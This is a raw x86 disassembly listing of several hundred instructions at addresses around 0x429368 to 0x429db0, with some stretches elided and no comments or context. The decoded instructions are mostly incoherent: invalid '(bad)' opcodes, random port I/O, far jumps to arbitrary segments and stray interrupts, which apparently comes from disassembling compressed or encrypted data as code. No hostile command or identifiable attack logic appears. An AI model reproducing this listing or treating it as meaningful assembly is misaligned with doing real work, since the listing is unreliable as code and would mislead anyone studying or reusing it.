  429368:	push   ss
  429369:	push   esp
  42936a:	push   0xffffffd3
  42936c:	jle    0x429381
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x23
  4293e3:	push   edi
  4293e4:	inc    esp
  4293e5:	or     esp,DWORD PTR [edi-0x46]
  4293e8:	add    DWORD PTR [eax],eax
  4293ea:	add    BYTE PTR [ecx],al
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	es stos BYTE PTR es:[edi],al
  4293f0:	adc    BYTE PTR [ebx+0x70],bh
  4293f3:	adc    BYTE PTR [ebx+0x17997b92],ch
  4293f9:	ret    0x84d2
  4293fc:	and    DWORD PTR [eax+0x15],ebp
  4293ff:	test   BYTE PTR [edi],0x4e
  429402:	imul   edi,DWORD PTR [ebx],0x5b
  429405:	xchg   BYTE PTR [esi+esi*2+0x58],bh
  429409:	inc    ecx
  42940a:	pop    ebx
  42940b:	lock push es
  42940d:	icebp  
  42940e:	test   al,0xda
  429410:	ins    DWORD PTR es:[edi],dx
  429411:	in     eax,dx
  429412:	and    al,0x8a
  429414:	dec    ecx
  429415:	outs   dx,DWORD PTR ds:[esi]
  429416:	or     bh,BYTE PTR [eax]
  429418:	inc    esp
  429419:	mov    ah,0x41
  42941b:	ret    
  42941c:	mov    esp,0x21380428
  429421:	stos   DWORD PTR es:[edi],eax
  429422:	fild   DWORD PTR [edx]
  429424:	pop    eax
  429425:	hlt    
  429426:	or     edx,0x7b
  429429:	push   ebp
  42942a:	push   eax
  42942b:	dec    ecx
  42942c:	push   es
  42942d:	or     ch,BYTE PTR [edx-0x4d]
  429430:	aad    0x11
  429432:	xchg   DWORD PTR [eax-0x52],edx
  429435:	push   edx
  429436:	jmp    0x7d750da5
  42943b:	adc    BYTE PTR [ecx+0x4863a0c9],ah
  429441:	mov    eax,ds:0x4695a450
  429446:	rol    BYTE PTR [edi],0xc4
  429449:	loop   0x4293ff
  42944b:	push   edx
  42944c:	std    
  42944d:	push   0xffffff83
  42944f:	(bad)  
  429450:	sbb    DWORD PTR [esi+ebp*4+0xa9bbb39],edi
  429457:	and    edi,ecx
  429459:	inc    esi
  42945a:	jmp    0x5de34fc8
  42945f:	shl    ch,0x53
  429462:	push   ecx
  429463:	ja     0x4294c6
  429465:	mov    eax,0xd61a108d
  42946a:	cmp    esp,DWORD PTR [ebx-0xc]
  42946d:	cmp    BYTE PTR [esi-0x8],ch
  429470:	mov    esp,0x2a49d0b2
  429475:	test   al,0xa7
  429477:	mov    bl,0xee
  429479:	stc    
  42947a:	and    ebp,DWORD PTR [ecx+ebx*1+0x1a]
  42947e:	push   eax
  42947f:	xlat   BYTE PTR ds:[ebx]
  429480:	cmp    bh,BYTE PTR [ebp-0x6f]
  429483:	sbb    BYTE PTR [edi],0x1a
  429486:	(bad)  
  429487:	xor    DWORD PTR [edi-0x5d],esp
  42948a:	js     0x42945d
  42948c:	xchg   esp,eax
  42948d:	and    esp,DWORD PTR [esi]
  42948f:	test   eax,0x10863710
  429494:	repnz div BYTE PTR gs:[ecx+ebx*2-0x64]
  42949a:	scas   al,BYTE PTR es:[edi]
  42949b:	ror    BYTE PTR [eax+esi*2],cl
  42949e:	push   eax
  42949f:	lods   al,BYTE PTR ds:[esi]
  4294a0:	jno    0x429519
  4294a2:	cmc    
  4294a3:	addr16 mov ds:0x290b,al
  4294a7:	xor    al,0xfd
  4294a9:	mov    ah,0xb6
  4294ab:	dec    esi
  4294ac:	loope  0x4294a4
  4294ae:	mov    ah,0x5e
  4294b0:	test   eax,0x703e02c6
  4294b5:	mov    edx,0xedc4e8bf
  4294ba:	sub    al,0x47
  4294bc:	(bad)  
  4294bd:	gs leave 
  4294bf:	push   ds
  4294c0:	xor    cl,dh
  4294c2:	ins    DWORD PTR es:[edi],dx
  4294c3:	pop    esi
  4294c4:	fmul   QWORD PTR [esi]
  4294c6:	test   al,0xb2
  4294c8:	int    0xdc
  4294ca:	retf   
  4294cb:	mul    edi
  4294cd:	js     0x429488
  4294cf:	inc    ebx
  4294d0:	mov    dh,0x5c
  4294d2:	cmp    ah,BYTE PTR ds:0x41a40f25
  4294d8:	into   
  4294d9:	pop    ss
  4294da:	and    BYTE PTR [ecx],ah
  4294dc:	mov    BYTE PTR [ecx],bh
  4294de:	sbb    al,0x87
  4294e0:	aaa    
  4294e1:	inc    esi
  4294e2:	test   DWORD PTR [ebp-0x80],edx
  4294e5:	ss jle 0x42955a
  4294e8:	je     0x429504
  4294ea:	mov    esp,0xc6dc3c
	...
  429553:	add    BYTE PTR [eax],al
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x7c34fc16],dx
  429565:	call   0x4450d1
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	lds    ebx,FWORD PTR [ecx]
  429570:	sub    al,0x2
  429572:	jg     0x4295d4
  429574:	jne    0x429509
  429576:	mov    bh,0xf9
  429578:	adc    DWORD PTR [ebx-0x4db74c29],esp
  42957e:	pop    ebx
  42957f:	push   ebx
  429580:	(bad)  
  429581:	out    dx,eax
  429582:	retf   
  429583:	in     al,0xe0
  429585:	push   es
  429586:	sbb    al,0x8c
  429588:	jle    0x429511
  42958a:	call   0xe50771a2
  42958f:	ret    
  429590:	lds    esi,FWORD PTR [edx+0x1cde9918]
  429596:	inc    ebx
  429597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429598:	inc    eax
  429599:	ss aas 
  42959b:	loopne 0x4295b7
  42959d:	cmc    
  42959e:	pop    ds
  42959f:	(bad)  
  4295a0:	fild   DWORD PTR [eax]
  4295a2:	(bad)  
  4295a3:	sbb    eax,0xf614f814
  4295a8:	ja     0x429597
  4295aa:	jne    0x42959c
  4295ac:	sbb    al,0xc0
  4295ae:	mov    dh,0x39
  4295b0:	rcl    DWORD PTR ss:[edx],cl
  4295b3:	mov    cl,0xd8
  4295b5:	push   cs
  4295b6:	xchg   DWORD PTR [edx+0x2],edi
  4295b9:	daa    
  4295ba:	push   ebx
  4295bb:	and    eax,0xe43fa55
  4295c0:	es inc ebp
  4295c2:	sub    ebx,DWORD PTR [edx-0xe]
  4295c5:	pop    edi
  4295c6:	fs mov ebx,0xbd2c36f5
  4295cc:	in     al,0x5b
  4295ce:	sbb    esp,DWORD PTR [esi+0xf]
  4295d1:	adc    al,0x73
  4295d3:	adc    eax,0x2eb01e7c
  4295d8:	aaa    
  4295d9:	and    al,0x32
  4295db:	push   ecx
  4295dc:	lods   al,BYTE PTR ds:[esi]
  4295dd:	out    dx,al
  4295de:	mov    edx,0x534eb212
  4295e3:	ds or  ah,dh
  4295e6:	inc    edx
  4295e7:	imul   edi,eax,0xffffffe4
  4295ea:	jp     0x4295f3
  4295ec:	imul   ebx,DWORD PTR [ebp+0x1c],0x4a13f786
  4295f3:	jns    0x4295f5
  4295f5:	pop    esp
  4295f6:	push   ds
  4295f7:	pusha  
  4295f8:	out    0xde,al
  4295fa:	push   ecx
  4295fb:	pop    esi
  4295fc:	int    0x2c
  4295fe:	inc    esp
  4295ff:	sbb    BYTE PTR [esi],cl
  429601:	ffreep st(2)
  429603:	xchg   edi,eax
  429604:	xor    edx,ebp
  429606:	and    al,0xfc
  429608:	js     0x429673
  42960a:	inc    ebp
  42960b:	push   eax
  42960c:	cld    
  42960d:	dec    ebp
  42960e:	scas   al,BYTE PTR es:[edi]
  42960f:	in     al,0x24
  429611:	adc    eax,0x956c2452
  429616:	add    eax,0x50e8a5b1
  42961b:	xor    al,0x32
  42961d:	addr16 es jo 0x429611
  429621:	mov    WORD PTR [ecx],?
  429623:	call   0xe434c719
  429628:	cld    
  429629:	test   eax,0x1fd4136e
  42962e:	or     bh,BYTE PTR [esi+0x32]
  429631:	rep outs dx,BYTE PTR ds:[esi]
  429633:	pop    eax
  429634:	xor    ecx,ebx
  429636:	add    esp,DWORD PTR [esi]
  429638:	inc    eax
  429639:	cmp    DWORD PTR [esi+0x7bc868a0],ebx
  42963f:	das    
  429640:	outs   dx,BYTE PTR ds:[esi]
  429641:	popf   
  429642:	sbb    DWORD PTR [edx+0x7b720680],esi
  429648:	aam    0x0
  42964a:	sbb    al,0x2f
  42964c:	lds    eax,FWORD PTR [esi]
  42964e:	and    DWORD PTR [ecx-0x4e84b8fa],ecx
  429654:	and    BYTE PTR [edi],cl
  429656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429657:	test   bl,al
  429659:	in     eax,0xfa
  42965b:	mov    al,ds:0xd1fe892e
  429660:	int    0xf6
  429662:	and    esi,ebp
  429664:	loopne 0x4296ae
  429666:	adc    edi,DWORD PTR [ecx+0x2b2461f]
  42966c:	not    BYTE PTR [eax]
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	fcmovb st,st(4)
  4296e4:	clc    
  4296e5:	push   ds
  4296e6:	addr16 mov esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	jl     0x42975b
  4296f0:	shl    BYTE PTR [ebx-0x5ed07a83],0xd2
  4296f7:	in     al,dx
  4296f8:	mov    al,0x34
  4296fa:	xor    ah,bl
  4296fc:	outs   dx,DWORD PTR ds:[esi]
  4296fd:	cmp    dh,ch
  4296ff:	xor    eax,DWORD PTR [esi-0x5f96c095]
  429705:	out    0x2b,eax
  429707:	repz jmp 0x4296dd
  42970a:	arpl   WORD PTR ds:0x3ce69ad3,ax
  429710:	push   edx
  429711:	or     BYTE PTR [esi+0x64],cl
  429714:	sub    DWORD PTR [eax+0x5c],esp
  429717:	xlat   BYTE PTR ds:[ebx]
  429718:	and    BYTE PTR [ebx-0x21],al
  42971b:	pop    ds
  42971c:	add    dh,BYTE PTR [eax]
  42971e:	dec    eax
  42971f:	cdq    
  429720:	sub    dh,BYTE PTR [esi+ebx*1+0x2c]
  429724:	adc    al,0x79
  429726:	out    0x76,al
  429728:	jno    0x429779
  42972a:	xor    DWORD PTR cs:[edi],ebx
  42972d:	cmp    al,0xe2
  42972f:	not    BYTE PTR [edi+0x8]
  429732:	shl    BYTE PTR [ebx+0x6],cl
  429735:	push   ss
  429736:	or     cl,BYTE PTR [esi]
  429738:	jno    0x4297a3
  42973a:	lahf   
  42973b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42973c:	add    DWORD PTR [esi-0xb],edx
  42973f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429741:	lea    edi,[esi+0x35]
  429744:	lock (bad) 
  429746:	call   0x6592d56c
  42974b:	xor    BYTE PTR [edi-0x1d],bh
  42974e:	int3   
  42974f:	retf   
  429750:	in     eax,0xcd
  429752:	pop    ebx
  429753:	xor    esi,DWORD PTR [edi-0x5ba20475]
  429759:	inc    edi
  42975a:	mov    ebp,DWORD PTR [ecx]
  42975c:	add    ebx,edx
  42975e:	out    0xf8,al
  429760:	ret    
  429761:	xor    al,0xfc
  429763:	adc    al,0x3e
  429765:	mov    bl,0xaf
  429767:	push   ds
  429768:	(bad)  
  429769:	cmp    ebp,DWORD PTR [esi+ecx*2]
  42976c:	jbe    0x429749
  42976e:	imul   ebx,DWORD PTR [eax+0x30814cba],0xaa3af138
  429778:	add    bh,BYTE PTR [ecx+0x451a21ed]
  42977e:	and    edx,DWORD PTR [esi]
  429780:	sar    cl,cl
  429782:	adc    DWORD PTR [eax+0x77],edx
  429785:	cmc    
  429786:	adc    al,0x1a
  429788:	jecxz  0x4297a5
  42978a:	dec    esi
  42978b:	jl     0x429720
  42978d:	mov    DWORD PTR [ecx],ebx
  42978f:	adc    eax,0xc39434f7
  429794:	fldenv [edx-0x5a]
  429797:	or     eax,DWORD PTR [ebx+edx*8+0x5107d1fe]
  42979e:	mov    bl,0xda
  4297a0:	dec    esp
  4297a1:	fadd   DWORD PTR [esi-0x107c9ed7]
  4297a7:	push   ebx
  4297a8:	outs   dx,BYTE PTR ds:[esi]
  4297a9:	and    bh,bh
  4297ab:	adc    al,0xba
  4297ad:	jb     0x42975a
  4297af:	xchg   edi,eax
  4297b0:	mov    ebx,0x5d3d2468
  4297b5:	ds mov dl,0x4
  4297b8:	adc    ch,0x5a
  4297bb:	into   
  4297bc:	scas   eax,DWORD PTR es:[edi]
  4297bd:	pop    ebp
  4297be:	shr    dl,1
  4297c0:	fbld   TBYTE PTR [ebp-0x57]
  4297c3:	or     DWORD PTR [ebx],eax
  4297c5:	mov    ch,0xe5
  4297c7:	inc    ecx
  4297c8:	ja     0x4297cf
  4297ca:	(bad)  
  4297cb:	xor    ebx,edi
  4297cd:	mov    ebx,0x7d80b42f
  4297d2:	call   0x4dfa34fd
  4297d7:	inc    ecx
  4297d8:	pop    edx
  4297d9:	loope  0x429824
  4297db:	(bad)  
  4297dc:	jne    0x4297b0
  4297de:	mov    BYTE PTR ds:0x8bdb43c5,dh
  4297e4:	call   0xac514c50
  4297e9:	or     eax,0xdb4809e3
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	mov    dl,0x31
  429864:	and    BYTE PTR [esi],dl
  429866:	addr16 mov ebp,0x1000001
  42986c:	add    BYTE PTR [eax],al
  42986e:	pop    eax
  42986f:	addr16 xchg ebx,eax
  429871:	mov    ah,0x9d
  429873:	push   ebp
  429874:	add    edx,ebx
  429876:	xlat   BYTE PTR ds:[ebx]
  429877:	test   DWORD PTR fs:[edx],0x93a71374
  42987e:	sbb    eax,0x3648835e
  429883:	jo     0x429888
  429885:	xchg   ebp,eax
  429886:	mov    ds:0xb445dd87,al
  42988b:	dec    ebx
  42988c:	mov    DWORD PTR [edx],esi
  42988e:	mov    al,ds:0x4133117
  429893:	ins    DWORD PTR es:[edi],dx
  429894:	popf   
  429895:	sub    eax,0x7e99244b
  42989a:	mov    al,0x27
  42989c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42989d:	inc    ebp
  42989e:	fwait
  42989f:	mov    ebp,0x5ad5e1cb
  4298a4:	fs pop ecx
  4298a6:	jge    0x4298cf
  4298a8:	dec    edx
  4298a9:	fwait
  4298aa:	loop   0x429896
  4298ac:	shl    DWORD PTR [edi+0x1b520fb6],1
  4298b2:	ret    0xdcd8
  4298b5:	mov    ch,0xcd
  4298b7:	add    dh,dh
  4298b9:	dec    edi
  4298ba:	sahf   
  4298bb:	ss mov dl,0xda
  4298be:	xchg   ebx,eax
  4298bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298c0:	fld    TBYTE PTR [ebp+0x1d]
  4298c3:	fcom   QWORD PTR [edx+0x5b24c24]
  4298c9:	rol    DWORD PTR [ebx-0x10e9eafa],cl
  4298cf:	mov    ch,0x5
  4298d1:	xchg   DWORD PTR ds:0x83cf852a,edi
  4298d7:	lods   eax,DWORD PTR ds:[esi]
  4298d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298d9:	jle    0x4298b6
  4298db:	inc    BYTE PTR [ebx+ebx*2-0x7f231c37]
  4298e2:	cmp    al,0xb9
  4298e4:	sbb    bl,dh
  4298e6:	xlat   BYTE PTR ds:[ebx]
  4298e7:	gs inc edi
  4298e9:	clc    
  4298ea:	rcl    dx,cl
  4298ed:	enter  0x3444,0xaa
  4298f1:	sar    BYTE PTR [eax],0xaa
  4298f4:	ins    DWORD PTR es:[edi],dx
  4298f5:	mov    ch,0xbf
  4298f7:	fadd   QWORD PTR [ebx]
  4298f9:	js     0x4298c4
  4298fb:	std    
  4298fc:	mov    bh,0xf0
  4298fe:	shl    DWORD PTR [ecx+0x42b7346e],cl
  429904:	jnp    0x4298bb
  429906:	mov    cl,0xc3
  429908:	sbb    edx,esp
  42990a:	xor    al,0xbe
  42990c:	fimul  DWORD PTR [eax-0x1a]
  42990f:	lahf   
  429910:	cmp    esi,eax
  429912:	aad    0x89
  429914:	sar    BYTE PTR [ecx-0x31],0xed
  429918:	ja     0x42990d
  42991a:	cwde   
  42991b:	in     eax,dx
  42991c:	shr    DWORD PTR [ebx],0xc1
  42991f:	cmp    BYTE PTR [ebx-0x7a],ch
  429922:	mov    dl,0x6f
  429924:	cmp    al,0xdb
  429926:	(bad)  
  429928:	outs   dx,DWORD PTR ds:[esi]
  429929:	popf   
  42992a:	mov    esi,0x52c923f0
  42992f:	mov    ebp,es
  429931:	push   edx
  429932:	cwde   
  429933:	adc    bh,BYTE PTR [esi+0xdfc5ed0]
  429939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42993a:	pop    edx
  42993b:	jmp    0xcb53a4fc
  429940:	xor    ch,BYTE PTR [ebx+0x279f0b02]
  429946:	mov    ds:0xe42f004a,al
  42994b:	inc    edx
  42994c:	hlt    
  42994d:	(bad)  
  42994e:	std    
  42994f:	jg     0x429931
  429951:	fdivr  QWORD PTR [eax]
  429953:	pushf  
  429954:	ins    DWORD PTR es:[edi],dx
  429955:	fld    DWORD PTR [ebp-0x6d]
  429958:	mov    eax,ds:0x9263f0c7
  42995d:	xchg   edi,eax
  42995e:	sbb    ah,ah
  429960:	add    DWORD PTR [edx-0x62],ebp
  429963:	xor    eax,DWORD PTR [esi-0x190e3822]
  429969:	stos   BYTE PTR es:[edi],al
  42996a:	imul   ebp,DWORD PTR [edx+0x7f],0xc5
	...
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	mov    BYTE PTR [esi-0x63],bl
  4299e5:	loop   0x429a4e
  4299e7:	mov    esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	cmp    BYTE PTR [ebx-0x30],al
  4299f1:	mov    esi,0x49ad73d1
  4299f6:	lahf   
  4299f7:	or     BYTE PTR [ecx+0x421647dc],al
  4299fd:	fdivr  QWORD PTR [edi-0x61d9d606]
  429a03:	iret   
  429a04:	pop    esi
  429a05:	scas   eax,DWORD PTR es:[edi]
  429a06:	adc    BYTE PTR ds:0x9720,ah
  429a0b:	mov    ebp,0xb09b4294
  429a10:	not    DWORD PTR [ebp-0x7d44cba9]
  429a16:	pusha  
  429a17:	out    dx,al
  429a18:	or     edx,DWORD PTR [edi+0x0]
  429a1b:	stos   DWORD PTR es:[edi],eax
  429a1c:	and    dl,BYTE PTR ds:0x2c4b035b
  429a22:	add    eax,0xffffffc9
  429a25:	outs   dx,DWORD PTR ds:[esi]
  429a26:	add    BYTE PTR [edx+0x18975887],al
  429a2c:	sbb    DWORD PTR ds:0x1119f7d0,esi
  429a32:	mov    edx,DWORD PTR [ecx+edi*1]
  429a35:	out    dx,al
  429a36:	jns    0x429a22
  429a38:	sub    al,cl
  429a3a:	pop    ds
  429a3b:	sbb    bh,dh
  429a3d:	push   ecx
  429a3e:	xor    ebx,DWORD PTR [edi]
  429a40:	mov    eax,ds:0x3e97dd9
  429a45:	sub    dl,cl
  429a47:	in     al,0xa5
  429a49:	xchg   BYTE PTR [esi+ebx*1-0x4a],bh
  429a4d:	cdq    
  429a4e:	stos   DWORD PTR es:[edi],eax
  429a4f:	dec    esp
  429a50:	inc    esi
  429a51:	xchg   ebp,eax
  429a52:	xlat   BYTE PTR ds:[ebx]
  429a53:	mov    eax,ds:0x84dd7061
  429a58:	shl    edi,1
  429a5a:	xor    BYTE PTR [edx],dh
  429a5c:	mov    ds:0xcfc8cc8,al
  429a61:	loope  0x429a94
  429a63:	ins    DWORD PTR es:[edi],dx
  429a64:	lds    esp,FWORD PTR [ecx]
  429a66:	mov    ah,0x34
  429a68:	cs and eax,ebx
  429a6b:	outs   dx,BYTE PTR ds:[esi]
  429a6c:	dec    ecx
  429a6d:	pop    eax
  429a6e:	out    dx,eax
  429a6f:	jle    0x429a14
  429a71:	mov    WORD PTR [edi],fs
  429a73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a74:	in     al,dx
  429a75:	inc    DWORD PTR [eax-0x374a2747]
  429a7b:	jno    0x429aad
  429a7d:	xchg   BYTE PTR [edi+0x2c13a6e7],dh
  429a83:	sub    eax,esp
  429a85:	sub    BYTE PTR [ebx],bl
  429a87:	adc    ebp,DWORD PTR [edx]
  429a89:	repnz mov BYTE PTR ds:0x5369fa26,bl
  429a90:	sub    esi,ecx
  429a92:	mov    BYTE PTR [eax+0x2b16fc6d],al
  429a98:	call   0x2c0d:0xcd0a0614
  429a9f:	and    edi,ebp
  429aa1:	mov    esi,0x16f12514
  429aa6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  429aa8:	dec    ebp
  429aa9:	lds    esi,FWORD PTR [eax-0x35]
  429aac:	das    
  429aad:	add    ah,BYTE PTR gs:[eax]
  429ab0:	jmp    0x429abf
  429ab2:	test   eax,0xc07e5942
  429ab7:	add    eax,0xb810ab88
  429abc:	adc    BYTE PTR [edi+ebp*1],dl
  429abf:	inc    edx
  429ac0:	or     DWORD PTR [di+0x63],edx
  429ac4:	mov    bl,0x90
  429ac6:	xor    esi,DWORD PTR [ebx]
  429ac8:	pop    esp
  429ac9:	daa    
  429aca:	jge    0x429aa5
  429acc:	push   ss
  429acd:	jnp    0x429a7f
  429acf:	mov    bh,0xe0
  429ad1:	mov    ah,0xb6
  429ad3:	and    DWORD PTR [eax+0x5683f361],esp
  429ad9:	out    dx,eax
  429ada:	adc    bh,bh
  429adc:	add    BYTE PTR [esp+esi*1],dh
  429adf:	cmc    
  429ae0:	loopne 0x429aaf
  429ae2:	or     ebp,DWORD PTR [edx+esi*2+0x2a]
  429ae6:	retf   0xa0f3
  429ae9:	inc    esi
  429aea:	test   DWORD PTR [ecx+0x386],0x0
	...
  429b54:	add    BYTE PTR [eax],al
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x55a95667
  429b63:	mov    ds:0xbf671ea2,al
  429b68:	add    DWORD PTR [eax],eax
  429b6a:	add    BYTE PTR [ecx],al
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	fsub   st(3),st
  429b70:	jmp    0x429bda
  429b72:	rcr    DWORD PTR [edi+eiz*4-0x26],cl
  429b76:	mov    edx,DWORD PTR [ebp-0x134363fe]
  429b7c:	pushf  
  429b7d:	jge    0x429b8d
  429b7f:	out    dx,al
  429b80:	je     0x429bef
  429b82:	mov    ds:0xe2b6a79f,eax
  429b87:	add    bl,BYTE PTR [edx-0x49]
  429b8a:	add    BYTE PTR [esi+0x69c2cf5f],ch
  429b90:	cld    
  429b91:	fdivr  st,st(1)
  429b93:	fcomp  QWORD PTR [ebp-0x10]
  429b96:	scas   eax,DWORD PTR es:[edi]
  429b97:	jmp    0x131b:0x4b99ace1
  429b9e:	adc    ebp,DWORD PTR [edi+eiz*4+0x9e15051]
  429ba5:	mov    DWORD PTR [ecx+ebp*2-0x8],ebx
  429ba9:	push   esp
  429baa:	add    edx,DWORD PTR [ebx+0x5dcfaa55]
  429bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bb1:	xchg   ecx,eax
  429bb2:	fld    QWORD PTR [ecx-0x25432fbe]
  429bb8:	pop    ecx
  429bb9:	mov    esi,0xa2a899ff
  429bbe:	or     DWORD PTR [esi],ebx
  429bc0:	dec    ebp
  429bc1:	pop    es
  429bc2:	cmp    BYTE PTR [ecx],bh
  429bc4:	xchg   edx,eax
  429bc5:	stos   DWORD PTR es:[edi],eax
  429bc6:	mov    edi,0xc377b5cf
  429bcb:	cmp    edx,DWORD PTR [edx-0x46dfcd9c]
  429bd1:	mov    cl,0x25
  429bd3:	add    al,0xd3
  429bd5:	xchg   ecx,eax
  429bd6:	push   0xffffffc3
  429bd8:	pushf  
  429bd9:	je     0x429c28
  429bdb:	(bad)  
  429bdc:	out    dx,al
  429bdd:	mov    gs,WORD PTR [edi]
  429bdf:	rcr    edi,1
  429be1:	fisub  DWORD PTR [eax+0x4628ef57]
  429be7:	and    BYTE PTR [esi-0x76],bh
  429bea:	pushf  
  429beb:	(bad)  
  429bed:	or     ah,ch
  429bef:	hlt    
  429bf0:	jle    0x429bfa
  429bf2:	mov    eax,ds:0x10cf3c11
  429bf7:	loope  0x429b81
  429bf9:	test   DWORD PTR [ecx-0x1d],esp
  429bfc:	sbb    eax,0x79359eac
  429c01:	jne    0x429ba4
  429c03:	test   DWORD PTR [ebp+0x5d616963],edi
  429c09:	cmc    
  429c0a:	cmp    al,0x1d
  429c0c:	ins    DWORD PTR es:[edi],dx
  429c0d:	ins    DWORD PTR es:[edi],dx
  429c0e:	shl    esp,0x6b
  429c11:	shl    BYTE PTR [ebx-0x3d0f6003],cl
  429c17:	hlt    
  429c18:	int3   
  429c19:	int3   
  429c1a:	(bad)  
  429c1b:	ins    BYTE PTR es:[edi],dx
  429c1c:	push   ecx
  429c1d:	test   BYTE PTR [edi-0x85e3b94],al
  429c23:	outs   dx,BYTE PTR ds:[esi]
  429c24:	mov    ds:0x230e4d63,eax
  429c29:	pop    edx
  429c2a:	outs   dx,DWORD PTR cs:[esi]
  429c2c:	jne    0x429ca2
  429c2e:	xor    DWORD PTR [esi+eiz*4+0x5f],0x79
  429c33:	cdq    
  429c34:	mov    bl,0x94
  429c36:	data16 aad 0xf1
  429c39:	dec    esp
  429c3a:	jbe    0x429c15
  429c3c:	add    DWORD PTR [eax-0x6d7fc2a8],esi
  429c42:	push   esp
  429c43:	and    BYTE PTR [ebx+0x535402ed],cl
  429c49:	les    ecx,FWORD PTR [eax]
  429c4b:	das    
  429c4c:	arpl   WORD PTR [eax+0x6e],bp
  429c4f:	(bad)  
  429c50:	sub    ebp,ebx
  429c52:	sub    eax,0x2178246f
  429c57:	xchg   ebx,eax
  429c58:	iret   
  429c59:	fistp  QWORD PTR [ebx+0x69fef001]
  429c5f:	inc    ebp
  429c60:	add    edx,DWORD PTR [ebx]
  429c62:	icebp  
  429c63:	call   0x3bee84d8
  429c68:	fisttp QWORD PTR [edi+0x55]
  429c6b:	stc    
  429c6c:	stos   BYTE PTR es:[edi],al
  429c6d:	sbb    al,0x0
	...
  429cd3:	add    BYTE PTR [eax],al
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR ds:0x6739e29d,al
  429ce7:	rol    BYTE PTR [ecx],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	fdivr  DWORD PTR [ebp+edx*1+0x22cda5bb]
  429cf5:	sbb    al,0xf4
  429cf7:	xchg   DWORD PTR [ebx],edi
  429cf9:	xor    ebx,ebp
  429cfb:	fstp   TBYTE PTR [edi-0x71]
  429cfe:	xchg   ebx,eax
  429cff:	ja     0x429ca5
  429d01:	outs   dx,DWORD PTR ds:[esi]
  429d02:	imul   eax,esp,0x7f
  429d05:	mov    dh,0xd1
  429d07:	jnp    0x429d15
  429d09:	add    cl,BYTE PTR ds:0x77604bee
  429d0f:	int    0x83
  429d11:	mov    ebx,0x86e9eee8
  429d16:	das    
  429d17:	and    eax,0x7634f374
  429d1c:	nop
  429d1d:	add    DWORD PTR [edi-0x7ed5076c],eax
  429d23:	repz pop es
  429d25:	jno    0x429d28
  429d27:	sbb    ch,BYTE PTR [ebx-0x44ea2783]
  429d2d:	cli    
  429d2e:	mov    edi,0xc4a1e371
  429d33:	popa   
  429d34:	fidivr DWORD PTR [edx+0x6e]
  429d37:	mov    al,dl
  429d39:	out    dx,eax
  429d3a:	dec    ecx
  429d3b:	add    DWORD PTR [edx],0x89363dc7
  429d41:	inc    edi
  429d42:	shl    DWORD PTR [edx],1
  429d44:	mov    esi,0xa92500ff
  429d49:	inc    ecx
  429d4a:	mov    bh,0x1f
  429d4c:	mov    ?,WORD PTR [ebx]
  429d4e:	or     eax,0xdb408128
  429d53:	lea    ebp,[eax-0x5b]
  429d56:	int    0xfe
  429d58:	in     eax,0x2f
  429d5a:	and    DWORD PTR [ebp-0x63],0x3a
  429d5e:	pop    ebx
  429d5f:	pop    esi
  429d60:	jmp    0x429da0
  429d62:	inc    ebx
  429d63:	xor    al,0xde
  429d65:	inc    esp
  429d66:	ret    0x1500
  429d69:	inc    ebp
  429d6a:	jmp    0x7fba:0x2af0f6aa
  429d71:	cs push cs
  429d73:	mov    eax,0xde9df8c
  429d78:	adc    dl,bl
  429d7a:	in     al,0x91
  429d7c:	fsubr  QWORD PTR [edi+0x4b]
  429d7f:	sbb    ah,BYTE PTR ds:[ebp+0x27]
  429d83:	jns    0x429d5d
  429d85:	or     BYTE PTR [ecx+0x76],al
  429d88:	daa    
  429d89:	and    al,0xfd
  429d8b:	mov    al,0xe
  429d8d:	cdq    
  429d8e:	cld    
  429d8f:	or     edi,edi
  429d91:	pop    es
  429d92:	jmp    0x776f:0x239cf938
  429d99:	xchg   DWORD PTR [eax],esi
  429d9b:	push   ds
  429d9c:	fs push eax
  429d9e:	jp     0x429df2
  429da0:	sahf   
  429da1:	fwait
  429da2:	push   es
  429da3:	call   0xc123:0xbe6b63ba
  429daa:	ds aam 0xbf
  429dad:	aas    
  429dae:	das    
  429daf:	xchg   edx,eax
  429db0:	ins    BYTE PTR es:[edi],dx
